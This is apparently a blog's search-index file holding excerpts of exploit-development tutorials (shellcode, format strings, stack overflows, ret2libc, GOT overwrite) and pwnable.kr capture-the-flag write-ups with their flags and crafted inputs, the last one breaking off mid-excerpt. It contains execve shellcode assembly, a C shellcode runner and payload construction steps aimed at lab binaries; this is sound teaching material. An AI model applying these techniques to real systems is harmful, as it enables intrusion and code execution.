var store = [{
        "title": "Exploitation with shellcode",
        "excerpt":"   EXPLOITATION WITH SHELLCODE   Shellcode is a piece of code performs specific action   Shellcode is written in ASM   Shellcode is architecture specific, so it is non portable between different processor types   Shellcode is typically written to directly manipulate processor registers to set them up for various system calls made with opcodes   When the ASM code has been written to perform the operation desired, it must then be converted to machine code and freed of any “null bytes” , because it must be free of any null bytes because many string operators such as strcpy() terminate when hitting them     SYSTEM CALLS (SYSCALL)   System call (commonly abbreviated to syscall) is the programmatic way in which a computer program requests a service from the kernel of the operating system on which it is executed   System calls provide an essential interface between a process and the operating system   System calls can only be made from userspace processes   Privileged system code also issues system calls   An interrupt automatically puts the CPU into some elevated privilege level and then passes control to the kernel, which determines whether the calling program should be granted the requested service. If the service is granted, the kernel executes a specific set of instructions over which the calling program has no direct control, returns the privilege level to that of the calling program, and then returns control to the calling program.   System calls provide a way to manage communication to hardware and functionality offered by the kernel that may not be included in the application’s address space   Most systems use ring levels(commonly 4 privileged levels) to provide security and protection from allowing an application to directly access hardware and certain system functions   For a user-level program to access a function outside of its address space, such as setuid(), it must identify the system call number of the desired function and then send an interrupt 0x80 (int 0x80)   NOTE  The instruction 'int 0x80/syscall' is an assembly instruction that invokes system calls on most *NIX OSs   WHY SYSCALL?   To enter kernel we can use Hardware Interrupt, Hardware Trap and Software Initiated Trap   We cannot trigger and use hardware related interrupts and traps   So lets use “Software Initiated Traps” to enter Kernel Mode   Systemcalls are a special case of software initiated trap. The machine instruction used to initiate a system call typically causes a hardware trap that is handled specially by the kernel   In Linux, the system calls are implemented using   lcall7/lcall27 gates (lcall7_func) int0x80 (software interrupt)   WORK FLOW   To perform a syscall , two or more arguments are required   The “syscall number” is loaded into “EAX register”   Arguments needed to be passed through syscall are stored in registers EBX,ECX and EDX(32bit) in the order followed by syscall table   In case of 64bit, QWORD registers and R8-R15 registers are used to store the arguments   GENERATING A SAMPLE ASM CODE FOR SYSCALL   EXAMPLE 1   Lets trigger the exit(0) using syscall by ASM   mov eax,1 mov ebx,0 int 0x80   Here EAX is loaded with 1, so it get the syscall with value 1   syscall_value = 1 —–&gt; syscall = sys_exit()   The value 0 is loaded into EBX so that it can be used as argument for syscall   int 0x80 is used to trigger interrupt and perform syscall   EXAMPLE 2   To spawn a “sh” shell using execve()   mov eax,0x0 \t\t//initialization push edx \t\t\t//nullbyte to terminate string (0x0) push 0x68732f2f \t//4bytes needed (//sh)['//' is same as '/'] little endian push 0x6e69622f \t//4bytes needed (/bin) little endian mov ebx, esp \t\t//moving SP into EBX push edx \t\t\t//pushing EDX into stack (0x0) push esp \t\t\t// ESP above EDX in stack mov ecx, esp \t\t// ESP stored in ECX for argv mov eax, 0x0b \t\t//loading eax with syscall value for execve() int 0x80 \t\t\t//calling syscall to perform interrupt   MORE ON SYSCALL   Type this command in terminal   man syscall man 'syscall(2)'   Also refer this table for more syscall values of each architecture     NULLBYTES 0x00   EFFECT OF NULL BYTES   Functions relying on a string operator such as strcpy(), to copy data into a buffer, and when these functions hit a null byte such as 0x00, they translate that as a string terminator. This, of course, causes our shellcode to fail   CAUSE OF NULL BYTES   Assembly instructions cause null bytes to reside within your shellcode   Improper initialization of registers   REMOVING NULL BYTES   TYPE 1   Consider you are using a register EAX (32bits/4bytes)   Whenever you are trying to store a small value in EAX(32bit)   mov eax,0x10   You can use AX(16bit) to store these small values(based on size)   Lower register AL(8bit) gets filled with values and Upper register AH(8bit) gets filled with NULLS   This causes null bytes when converting it into shellcode   Instead of loading small values in the whole register,   We can use its halves   mov al,0x10   TYPE 2   There comes a case in which we need to pass 0 as an argument to syscall   In that type of cases we could not load 0 into register, because it may create NULL BYTES in shellcode   To overcome this, we can store any arbitrary values in register and,   We can XOR the register   mov ebx,0x10 xor ebx,ebx   It is the best way because it does not affect the EFLAGS register   TYPE 3   We can SUB the register   mov ebx,0x10 sub ebx,ebx   TYPE 4   INC or DEC the register   Storing the count value in ECX   Performing INC(Increment) and DEC(Decrement)   inc ebx dec edx   TYPE 5   Moving 0 from another register   Lets assume 0x00 is in EDX   To load the value in EBX and to prevent null bytes   mov ebx,edx     GENERATING SHELLCODES   Lets assume a scenario where we want to call/spawn a shell from a attack vector   To spwan a shell we need to execute shellcode   And lets fix that we need to spawn “/bin/sh”   Lets replica this execve shellcode   COMMON CODE STRUCTURE   Common code structure to execute our shellcode using C program as an exploit is   char shellcode[] = \"SHELLCODE HERE\"; int main(int argc, char **argv){ \tint (*attack)(); \tattack = (int (*)())shellcode; \t(int)(*attack)(); }   OR   char shellcode[] = \"SHELLCODE HERE\"; int main(int argc, char **argv){ \t((int (*)())shellcode)(); }   EXPLOIT   Before we attack we need to check the architecture of the victim machine      Lets script the ASM code in editor to process it      Now,lets test the exploit generated from ASM code      Run “objdump” to view the hexvalues of each ASM instruction to craft shellcode      This is the SHELLCODE for our exploit   Copy the shellcode and embed it in another script so that it can run in executable memory      Compile the source code with “-z execstack” and “-nostdlib” to avoid “segmentation fault” and allowing the binary to run in executable memory      EXPLOIT IS DONE   Exploit Sample Is Given In GitHub Repo   AidenPearce369  ","categories": ["Exploit Development"],
        "tags": ["shellcode"],
        "url": "http://localhost:4000/exploit%20development/shellcodeexploit/",
        "teaser": "http://localhost:4000/assets/images/expdev/expdev.png"
      },{
        "title": "Format String Vulnerability",
        "excerpt":"   EXPLOITING FORMAT STRING VULNERABILITY   WHAT IS FORMAT STRING VULNERABILITY?   A Format String attack can occur when an input string data is processed by a vulnerable function so that attacker can pass the formats to exploit the stack values with the help of format string functions/printf() family functions   By format String vulnerability, an attacker can execute code, read the stack values, or cause a segmentation fault in the application   COMMON FORMATS IN PRINTF() FAMILY      %c - Formats a single character   %d - Formats an integer in decimal value   %f - Formats float in decimal value   %p - Formats a pointer to address location   %s - Formats a string   %x - Formats a hexadecimal value   %n - Number of bytes written   VULNERABLE FUNCTIONS TO FORMAT SRING      printf()   fprintf()   sprintf()   vprintf()   snprintf()   vsnprintf()   vfprintf()   vfprintf()   WHY DOES FORMAT STRING VULNERABILITY OCCUR   When we pass the input with format strings it gets called by the printf() to display as output   So if the input has valid data with respect to the formats it gets printed correctly   If the data has irrelevant format values with respect to printf() it can be exploited   Example:   1. If printf(data) is used, I can pass \"junkdata %d %p %lp %x\" to exploit the function 2. If printf(\"%s %p %p\",data), here data gets filled by %s and the remaining formats can get exploited into stack   When the format string does not have a corresponding variable to call the data, it will start popping random values from stack irrespective of their location/address   EXPLOITATION   EXAMPLE 1   Lets consider a simple program to test this vulnerability      Compiling tgis binary with GCC (no flags)      When we pass a normal string data, it prints it successfully      If we pass beyond the buffer it gets crashed   But if we pass string with format values, it give us the random stack values which is being popped from it      We are passing ‘%p’ to get address values in pointer format   Lets pass some data infront of format values      We can see our input from stack values at 6th position   Passing string inputs like this can help us to locate the position of our data, so that it can be useful for exploitation   Now we have traced the location from where our inputs get stored in stack   There is a chance that the application may crash when we call different format from the address which it does not have      We have passed our input with AAAABBBB   A —–&gt; 0x41   B —–&gt; 0x42   Since we are running in 64bit, we can store upto 8bytes in each address   We have located the place where our input gets stored &amp; we are veiwing it as pointer address from stack   When we try to call that location with ‘%s’ format, “SEGMENTATION FAULT” occurs   Because the address with 0x4242424241414141 does not have any string in it or it was out of bound with the memory of the application   So error occurs, be sure of the address and type of the format you are trying to call   The address you are going to call should have a value in it which can support the type of format you need   EXAMPLE 2   Lets try to get some data which is not being used in the application      Here we use a global variable ‘data’ which has some string in it   And we are printing the address of the variable in it   Lets compile the program using GCC, for 32 bit      By testing this application with inputs (fuzzing process)   You can see that our inputs get printed from the 11th location of the memory output   You can “directly” reference the location in format string vulnerability to call the values from stack at your desired location   To print the stack values from 11th location you can use ‘%11$p’ to represent the 11th location of the stack      Lets pass the address of the ‘data’ as our second input so that it gets stored in stack next to the first input   Pass the address in reverse order if “LITTLE ENDIAN”   NOTE   Always remember to fill with 8 bytes or else the address / expected value may get broken   Now our second data is at 12th place   We know that there is some string data in it, but we don’t know what it is      So we pass ‘%s’ format to read it as string from the stack memory   By passing ‘%s’ at 12th place      Lets make our payload with ‘%s’   Passing our payload with ‘%s’ makes us to view the data in 12th place as string   We can also do more exploitation with this vulnerability by accessing stack further more   MITIGATIONS           Use format strings corresponding to the assigned variables            Use of “%s” as format string can make the whole input as a single string            Use arguments to call values and functions            Defensive strategy like ‘format_gaurd’ can be used         Exploit Sample Is Given In GitHub Repo   AidenPearce369  ","categories": ["Exploit Development"],
        "tags": ["format string"],
        "url": "http://localhost:4000/exploit%20development/formatstring/",
        "teaser": "http://localhost:4000/assets/images/expdev/expdev.png"
      },{
        "title": "Buffer Overflow (ret2func)",
        "excerpt":"   EXPLOITING STACK BUFFER OVERFLOWS OVER FUNCTIONS    BUFFER OVERFLOW   A buffer overflow occurs when the size of data exceeds the storage capacity of the memory buffer   As a result, the program will try to write the data to the buffer which overwrites nearer memory locations Instruction Pointer(IP), Base Pointer(BP)   C and C++ are two languages that are highly susceptible to buffer overflow attacks, as they don’t have built-in safeguards against overwriting or accessing data in their memory   Mac OSX, Windows, and Linux all use code written in C and C++.   WHAT ARE BUFFERS?   Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to another   CAUSE &amp; MITIGATTION   Buffer overflow is triggered by user input   In the case of buffer overflow vulnerabilities, the developer must check the input length before using any functions that might cause an overflow to happen   These attacks are caused by vulnerable functions in C   The following five common unsafe functions that can lead to a buffer overflow vulnerability:   printf, sprintf, strcat, strcpy, and gets.   Unfortunately, the base C language provides only one safe alternative: fgets (to be used instead of gets). Various platforms have their non-standard implementations. For example, the Microsoft version of C includes sprintf_s, strcpy_s, and strcat_s   You can also protect against buffer overflows by using an extension of a compiler that uses “canaries”   The canaries are special values that the compiler places on the stack between the location of the buffer and the location of control data   When a buffer overflow occurs, it is the canary that is corrupted first and this corruption can be immediately detected   MEMORY LAYOUT   The memory layout of a binary in stack can be reprsented as      The buffer space grows towards the Base Pointer (BP) and Instruction Pointer (IP) from lower memory to higher memory      Below Base Pointer (BP) there will be Instruction Pointer (IP)/Return Address   The stack components of the program are always stored above the Base Pointer (BP)   EXAMPLE   Lets consider this simple program      Compile this to binary      Here we have declared a ‘buffer’ space for char array variable of 32 bytes   So by theory this buffer space of this variable should hold only 32 bytes   Lets check it by passing inputs of random length      If we pass input with size less than 32 bytes,it runs perfectly   But if this size limit exceeds,it stores this input from the starting space of the ‘buffer’ and it ends in memory where the input data ends   Until that size, our input can overwrite the buffer space in the stack memory   This leads to serious flaw by which an attacker can change the track of the program   When we overwrite some important registers like Instruction Pointer (IP) and Base Pointer (BP),it points to an address which can be utilized for exploitation   It the address is not meaningful, it gives “ERRORS”(Segmentation Fault/Stack Smashing Detected/Core Dumped)   But with the help of the input values we can ovewrite these important register correctly to acheive our desired task/function     EXPLOITATION   Lets see how to use buffer overflow in stack to call another function from the memory   In this program we can see a function named “hidden” which is not being called in “main()”   So the actual program should receive input and print it as output   It should not display the contents inside the “hidden()”      To test stack based buffer overflows in Linux, you need to compile the source code with certain flags to enable “DISABLE STACK PROTECTION &amp; STACK EXECUTION”      STEP 1 : CHECKING ASLR   Here we use a debugging line to print the address of “hidden()” function   Whenever this function needs to be called, our binary uses “call address_of_hidden()” in ASM to run “hidden()”   This program prints random address for “hidden()” whenever it is being called      This is because of ASLR present in the machine   ASLR (Address Space Layout Randomization)  Address space layout randomization (ASLR) is a memory-protection process for operating systems (OSes) that guards against buffer-overflow attacks by randomizing the location where system executables are loaded into memory   Lets disable ASLR to get the fixed address of “hidden()” to perform successful buffer overflow attack      Now the ASLR is disabled   Lets check for the address of “hidden()”      No matter how many times we run, it always gives us fixed address of “hidden()” when we try to run the program, because ASLR is disabled   STEP 2 : CRASHING THE PROGRAM   When all the protections are disabled, try to crash the program with inputs of random sizes      You can see that this program also gets crashed due to the size of the input passed which is larger than the buffer size   We can also view the crash with traps using “dmesg”      By seeing this we can come to a conclusion that this program is vulnerable to buffer overflow attack   STEP 3 : FINDING OFFSET   Lets pass the input data to crash the program and test it in GDB Debugger      So, when we pass the random junks of ‘A’ in input it causes an error   And during the crash the Base Pointer (BP) value is set as 0x4141414141414141   Here we can say that our junk input overwrote the Base Pointer (BP) register   We need to find the offset(location) of the Base Pointer (BP) so that we can craft our payload precisely   Lets create a random pattern of 100 bytes with “GDB-PEDA” and pass it through the program      Our pattern overflowed the buffer space and the Base Pointer (BP) causing an error   In this , we can see that our Base Pointer (BP) is filled by a random value from the pattern we passed as input      This value is a part of our pattern we passed      So this value can be used to find the offset of our Base Pointer (BP)      By calculating the offset it says that our Base Pointer (BP) memory starts after 64bytes of the “buffer” memory   STEP 4 : CONTROLLING INSTRUCTION POINTER   We know where our Base Pointer (BP) starts   Next to Base Pointer (BP) is the Instruction Pointer (IP)   Instruction Pointer (IP)  It is a register responsible for storing the address of next instruction which is needed to be executed in stack    The main goal of all buffer overflow attacks is to overwrite the Instruction Pointer (IP) which can help the attacker to redirect the program to their purpose   We know that for x64 architecture, Base Pointer (BP)        ---&gt; 8 bytes Instruction Pointer (IP) ---&gt; 6 bytes 'A' in hex               ---&gt; 0x41 'B' in hex               ---&gt; 0x42   Lets pass an input crafted with the help of python to check,whether we can overwrite the IP or not      Here we have ‘A’s to fill upto BP   And 8 ‘B’s to fill BP   And 6 ‘B’s to fill IP   Lets pass this input and check it      Here we can see that BP and IP is overwritten successfully      STEP 5 : EXPLOITING WITH PAYLOAD   Now we have verified that we can overwrite IP successfully   To spawn the function “hidden()” we need to call it using IP   When IP is pointed with the address of “hidden()”,it executes the contents in the “hidden()” and allocates the registers according to the stack and continues the execution      Since we are using “LITTLE ENDIAN” our address should be represented in reverse order   Lets test the payload      Here we can see our “hidden()” function has been pwned successfully   Lets try this out of debugger      EXPLOIT IS DONE   STACK BUFFER OVERFLOW IS PERFORMED     Exploit Sample Is Given In GitHub Repo   AidenPearce369   ","categories": ["Exploit Development"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/exploit%20development/bufferoverflow/",
        "teaser": "http://localhost:4000/assets/images/expdev/expdev.png"
      },{
        "title": "Return To LIBC Attack (ret2libc)",
        "excerpt":"   Ret2Libc EXPLOIT    Ret2Libc —&gt; Return To LIBC   LIBC   The term “libc” is commonly used as a shorthand for the “standard C library”, a library of standard functions that can be used by all C programs (and sometimes by programs in other languages).   For more on LIBC   METHODOLOGY   Whenever a function is called by a program, the arguments required for this function are loaded into stack so that it can be pointed by Base Pointer(BP) easily to process the instructions.   We cannot point an arbitraty address into Instruction Pointer (IP) to run our shellcode from that address.   This will fail, because there is no execution of shellcode when NX bit is enabled.   The common way to bypass NX bit protection is to try ret2libc attack   In this attack, we would be loading the function arguments directly into stack so that it can be called by other function we need.   WORKING MECHANISM   So in order to make this work,           We would be passing our arguments of the function into the stack by loading it into buffer space            Pointing our Instruction Pointer(IP) to another function which uses our passed inputs as arguments            Return function to execute when the program comes out of the pointed function       WHAT TYPE OF FUNCTIONS NEED TO BE POINTED   Reusable functions need to be pointed in Instruction Pointer (IP)   These functions can be inbuilt in the program or it can be called from libraries   For ret2libc, the function should be from LIBC   EXPLOITATION   In Ret2Libc attack we will be pointing functions from LIBC library   That is how this attack got its name, “ret2libc”   When it comes to LIBC, each function inside this library is present at fixed offset from the base of the library   If library version and library base value address is known,we can calculate the address of any function from it easily   To calculate the function address in LIBC , Click Here   SPAWNING SHELL USING RET2LIBC   Lets consider a vulnerable program as an example for this attack      Lets compile this binary in 32 bit mode      We did not use -z execstack to make the stack executable   Lets run “checksec” to check the security protections of this binary file      So our NX bit should be enabled, to avoid execution in stack   CRASHING OUR PROGRAM   Lets check that this program can be crashed or not      This program crashes when we pass input larger than the buffer size   FINDING OFFSET   After confirming the program crash   We need to find the offset of the Instruction Pointer (IP)   So that we can pass our payload precisely into the buffer   Lets create a random pattern in GDB-PEDA to pass it as input to find the offset value      Passing this pattern into the buffer our program crashes again      We can see that our Base Pointer (BP), Instruction Pointer (IP) are overwritten with the values from the pattern generated      Now we found the offset value of Instruction Pointer (IP) from the pattern value   CONTROLLING INSTRUCTION POINTER   Lets craft an input data in python to test whether we can overwrite the Instruction Pointer (IP) correctly or not      After our program crash, by checking the registers we can say that our input data overwrote the registers successfully      Our Instruction Pointer (IP) is filled by 0x42424242   So we control the Instruction Pointer (IP) now   FORMING RET2LIBC   To perform ret2libc successfully,we need an usable and executable function with arguments   A return function to execute in case if we need to exit the function without crash (if needed)   Before that lets check our data in stack      Program crashes again      So our data ‘XXXXYYYYZZZZ’ gets stored in Stack Pointer (SP) correctly   In the place of ‘XXXXYYYYZZZZ’ we will be passing arguments which will be executed by the function when called   So the key to perform ret2libc depends on the values in the following order           Function needed to be called from Instrcution Pointer (Function is present in LIBC)            Return Function which will be executed when 1st function is exited            Arguments to be passed          Here to spawn shell we will be calling “system()” from LIBC   And passing “/bin/sh” as arguments it will spawn $   This is similar to,   system('/bin/sh')   The value “/bin/sh” should not be passed as string   It should be pointed from an address   When shell is spawned successfully,we need an exit function or else the program would crash   Here for this purpose we use “exit()” which is a simple exit function   To get the address of these functions, we can use GDB-PEDA to search it easily      Here we got the address of “system()” and “exit()” from LIBC   We can also see that these addresses lies in the region of executable memory of LIBC,such functions can only be used for ret2libc attack   Finding “/bin/sh” pointer      We can alose export an environment variable for our desired arguments and call it as pointers to perform ret2libc   GENERATING EXPLOIT   Now with these address values lets craft our exploit in python      Do not forget to convert these addresses to little endian (If processor is little endian)      Passing this exploit inside GDB debugger, we can see PIDs      So the shell is being spawned,it also printed the output of the command   Lets try it out of the debugger      or we can also run it from the script      Sometimes your exploit may fail due to improper STDIN handling   To overcome that you can use (cat payload;cat) | ./ret2libc   EXPLOIT IS DONE   RET2LIBC IS PERFORMED     Exploit Sample Is Given In GitHub Repo   AidenPearce369   ","categories": ["Exploit Development"],
        "tags": ["exploit dev","buffer overflow"],
        "url": "http://localhost:4000/exploit%20development/ret2libc/",
        "teaser": "http://localhost:4000/assets/images/expdev/expdev.png"
      },{
        "title": "GOT Overwrite",
        "excerpt":"   SPAWN SHELL USING SIMPLE GOT OVERWRITE     UNDERSTANDING BASICS   PROCEDURE LINKAGE TABLE (PLT)   Procedure Linkage Table(PLT) is a “read-only” section   It is responsible for calling the dynamic linker during and after the program runtime to resolve the addresses of the requested functions   During compilation we cannot mention these addresses because the function addresses of each system is unknown and shared object is also unavailable   So,PLT plays a vital role in resolving these function addresses during runtime   PLT table is much larger than the GOT table   Each program/binary has its own PLT table which is useful to itself only   When symbol resolution is requested, the request is made to the PLT by the calling function, and the address of the GOT is pushed into a processor register   This is how shared library functions are called via binaries to execute their desired functions   GLOBAL OFFSET TABLE (GOT)   Global Offset Table(GOT) is popped by a dynamic linker during programming runtime   Dynamic linker obtains the absolute addresses of requested functions and updates the GOT as requested   Files do not need to be relocatable because the GOT takes requests for locations from the Procedure Linkage Table (PLT)   Many functions will not be resolved at runtime and get resolved only on the first call to the requested function   This is a process known as “lazy linking”, which saves on resources   Once a PLT address of a function is linked with GOT address of the function in a program, the program can call that specific function from libraries directly with the help of PLT-GOT translation   WORKING OF PLT-GOT        GOT OVERWRITE   GOT Overwrite is a binary exploitation technique where the GOT address of a function is replaced with the address of our desired function   Assume we are going to call “printf()” in the program   When a “printf()” inside the program is called it checks the PLT table first   While checking the PLT table of the “printf()” function, it seeks for the GOT address of “printf()” to run the function so that “printf()” can be called from library directly   If we overwrote the GOT address of “printf()” with another desired function’s address   When “printf()” is called it goes to PLT and acquires the manipulated GOT address and executes our desired function   Arguments required for “printf()” will also be passed into our desired function   Thats how we can overwrite GOT values to execute our desired function     EXPLOITATION   Lets perform GOT Overwrite with this source code      Here simple functions like gets(),puts(),strlen() are used   This program doesn’t do any complex operations,just a simple program   Lets compile this program      Now, lets try to execute this program normally      Disassembling the program using GDB-PEDA         Here we can see that many functions are called using PLT table   Now lets check the PLT address of “puts()”      Here 0x80490d0 is the PLT address value of “puts()”   To get the GOT address of “puts()”, lets check into PLT of “puts()”   Every GOT needs to be called from PLT   Viewing the JMP instruction   GOT address of “puts()” is 0x804c018   Now lets redirect our “puts()” to “system()”   To find “system()” address      Its time to set the GOT of “puts()” with the address of “system()”   If we overwrote that, whenever “puts()” is called “system()” executes   After manipulating the GOT address we will be passing our data into “buffer” using “gets()”   In our actual program “puts(buffer)” is passed, so that it will print the data from “buffer”   Data from “buffer” is passed as argument to “puts()”   Since we overwrote “puts()” with “system()”, the argument from “buffer” will be passed into “system()”      This is a potential RCE   So, if we pass “/bin/sh” into “system()” as argument from “buffer”   It works like   system(\"/bin/sh\");   Opening a shell for us      Thus GOT overwrite is performed to spawn shell in this simple program   ","categories": ["Exploit Development"],
        "tags": ["exploit dev","got overwrite"],
        "url": "http://localhost:4000/exploit%20development/got/",
        "teaser": "http://localhost:4000/assets/images/expdev/expdev.png"
      },{
        "title": "pwnable.kr - fd",
        "excerpt":"Lets connect to the server   ra@moni~/P/pwnable.kr&gt; ssh fd@128.61.240.205 -p 2222 fd@128.61.240.205's password:  ____  __    __  ____    ____  ____   _        ___      __  _  ____ |    \\|  |__|  ||    \\  /    ||    \\ | |      /  _]    |  |/ ]|    \\ |  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  ) |   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \\ |    / |  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \\|    \\ |  |   \\      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \\ |__|    \\_/\\_/  |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_|  - Site admin : daehee87@gatech.edu - IRC : irc.netgarage.org:6667 / #pwnable.kr - Simply type \"irssi\" command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have mail. Last login: Wed Jun  2 04:57:50 2021 from 106.114.115.94 fd@pwnable:~$   After listing the files, we can see there are some privilege restrictions   fd@pwnable:~$ ls -la total 40 drwxr-x---   5 root   fd   4096 Oct 26  2016 . drwxr-xr-x 115 root   root 4096 Dec 22 08:10 .. d---------   2 root   root 4096 Jun 12  2014 .bash_history -r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd -rw-r--r--   1 root   root  418 Jun 11  2014 fd.c -r--r-----   1 fd_pwn root   50 Jun 11  2014 flag -rw-------   1 root   root  128 Oct 26  2016 .gdb_history dr-xr-xr-x   2 root   root 4096 Dec 19  2016 .irssi drwxr-xr-x   2 root   root 4096 Oct 23  2016 .pwntools-cache   It seems like we cannot read the flag directly   fd@pwnable:~$ whoami fd fd@pwnable:~$ cat flag cat: flag: Permission denied   And analysing our source code of the binary we get,   The RAW CODE is given below,   fd@pwnable:~$ cat fd.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ \tif(argc&lt;2){ \t\tprintf(\"pass argv[1] a number\\n\"); \t\treturn 0; \t} \tint fd = atoi( argv[1] ) - 0x1234; \tint len = 0; \tlen = read(fd, buf, 32); \tif(!strcmp(\"LETMEWIN\\n\", buf)){ \t\tprintf(\"good job :)\\n\"); \t\tsystem(\"/bin/cat flag\"); \t\texit(0); \t} \tprintf(\"learn about Linux file IO\\n\"); \treturn 0;  }   From here we can see,           This binary uses a global variable buf of 32 bytes            This binary gets two inputs from arguments (ie. Filename Arg1 )            It uses atoi() to convert string to integer            It uses read() to get the input data            It uses strcmp() and compares it with LETMEWIN to display the flag       First inorder to compare the data, we need to store it in the buf   Here we are using read() to store it in buf   To use read() properly we need to pass the “file descriptor” correctly   read() needs 0 as file descriptor   For more about File Descriptor   To make our file descriptor fd as 0   we should make use of int fd = atoi( argv[1] ) - 0x1234;   So if we pass a value of 0x1234 in argv[1] we could activate read()   Now we need to find value of 0x1234 in int   Python 3.8.5 (default, May 27 2021, 13:30:53) [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. &gt;&gt;&gt; print(0x1234) 4660   If we pass this value, our read() function should be opened to pass our data   Now lets pass LETMEWIN in our buf   fd@pwnable:~$ ./fd pass argv[1] a number fd@pwnable:~$ ./fd 4660 LETMEWIN good job :) mommy! I think I know what a file descriptor is!!   Thats it, we got our conditions true   And we get the flag   FLAG: mommy! I think I know what a file descriptor is!!  ","categories": ["Pwn"],
        "tags": ["file descriptors"],
        "url": "http://localhost:4000/pwn/1-fd/",
        "teaser": "http://localhost:4000/assets/images/pwn/pwn.png"
      },{
        "title": "pwnable.kr - collision",
        "excerpt":"Lets connect to our server,   ra@moni~&gt; ssh col@128.61.240.205 -p 2222 col@128.61.240.205's password:  ____  __    __  ____    ____  ____   _        ___      __  _  ____ |    \\|  |__|  ||    \\  /    ||    \\ | |      /  _]    |  |/ ]|    \\ |  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  ) |   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \\ |    / |  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \\|    \\ |  |   \\      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \\ |__|    \\_/\\_/  |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_|  - Site admin : daehee87@gatech.edu - IRC : irc.netgarage.org:6667 / #pwnable.kr - Simply type \"irssi\" command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have new mail. Last login: Wed Jun  2 03:52:15 2021 from 49.205.143.178 col@pwnable:~$   After listing the files in it, we can see   col@pwnable:~$ ls -la total 36 drwxr-x---   5 root    col     4096 Oct 23  2016 . drwxr-xr-x 115 root    root    4096 Dec 22 08:10 .. d---------   2 root    root    4096 Jun 12  2014 .bash_history -r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col -rw-r--r--   1 root    root     555 Jun 12  2014 col.c -r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache col@pwnable:~$   It seems like there are some restrictions in privilege as usual,   col@pwnable:~$ cat flag cat: flag: Permission denied col@pwnable:~$   We cannot read our flag directly, so we have to use the binary to get it   By analyzing the file type of our binary using file command, we get   col@pwnable:~$ file col col: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=05a10e253161f02d8e6553d95018bc82c7b531fe, not stripped   Now lets view the source code of the binary from col.c   col@pwnable:~$ cat col.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ \tint* ip = (int*)p; \tint i; \tint res=0; \tfor(i=0; i&lt;5; i++){ \t\tres += ip[i]; \t} \treturn res; }  int main(int argc, char* argv[]){ \tif(argc&lt;2){ \t\tprintf(\"usage : %s [passcode]\\n\", argv[0]); \t\treturn 0; \t} \tif(strlen(argv[1]) != 20){ \t\tprintf(\"passcode length should be 20 bytes\\n\"); \t\treturn 0; \t}  \tif(hashcode == check_password( argv[1] )){ \t\tsystem(\"/bin/cat flag\"); \t\treturn 0; \t} \telse \t\tprintf(\"wrong passcode.\\n\"); \treturn 0; }  Now after analyzing the binary, we can come to a conclusion that,           It has a global variable unsigned long hashcode = 0x21DD09EC;            It has a global function unsigned long check_password()            It gets two arguments (ie. filename,input1 )            It compare the input length which is equal to 20 bytes or not            If it passes these conditions, it compares the hashcode with check_password(input1)            If it is true, it displays the flag            Else it displays an error message       So the whole binary lies on this function,   unsigned long check_password(const char* p){ \tint* ip = (int*)p; \tint i; \tint res=0; \tfor(i=0; i&lt;5; i++){ \t\tres += ip[i]; \t} \treturn res; }  The value res being returned from this function should be equal to 0x21DD09EC   We knew the resultant value should be 0x21DD09EC,   The value in int is,   &gt;&gt;&gt; print(0x21DD09EC) 568134124   It is being looped 5 times and added to res,so   &gt;&gt;&gt; print(0x21DD09EC/5) 113626824.8   The function check_password(const char* p) gets its argument in char   But it typecasts itself into int array by int* ip = (int*)p;   Actually we need it to pass as char in input,not int   Maximum size of int is 4 bytes   So the int array would be split into 4 bytes for each loop,thus ( 5 loop * 4 bytes = 20 bytes )   Now,lets guess the input   res = 0x21DD09EC = 568134124   it should be in 5 parts (a,b,c,d,e)   &gt;&gt;&gt; print(0x21DD09EC/4) 142033531.0 &gt;&gt;&gt; print(0x21DD09EC%4) 0 &gt;&gt;&gt; print(0x21DD09EC/5) 113626824.8 &gt;&gt;&gt; print(0x21DD09EC%5) 4   So it can have 4 parts of equal value, if we go for 5 it gives float which cannot be converted into hex (only int to hex possible)   Converting it into hex   &gt;&gt;&gt; hex(142033531) '0x877427b'   The total value of 4 equal parts is equal to our needed res   &gt;&gt;&gt; hex(142033531*4) '0x21dd09ec'   But we cannot pass \\x00 null bytes into our input, because it will get terminated and our program won’t pass   So lets find the other way, by sharing values with 5 parts   &gt;&gt;&gt; print(0x21DD09EC/5) 113626824.8 &gt;&gt;&gt; print(0x21DD09EC%5) 4 &gt;&gt;&gt; print(0x21DD09EC//5) 113626824 &gt;&gt;&gt; print(568134124-(113626824*4)) 113626828 &gt;&gt;&gt; hex(113626824) '0x6c5cec8' &gt;&gt;&gt; hex(113626828) '0x6c5cecc'   So our first 4 parts have 0x6c5cec8 and the last part as 0x6c5cecc   Lets craft our string with these to pass as input,   ra@moni~&gt; python3 -c 'print(\"\\xc8\\xce\\xc5\\x06\" * 4 + \"\\xcc\\xce\\xc5\\x06\")' ÈÎÅÈÎÅÈÎÅÈÎÅÌÎÅ   Its time for our exploit,   We will be using pwntools   To install it pass pip install pwntools in yout terminal   Code for our exploit,   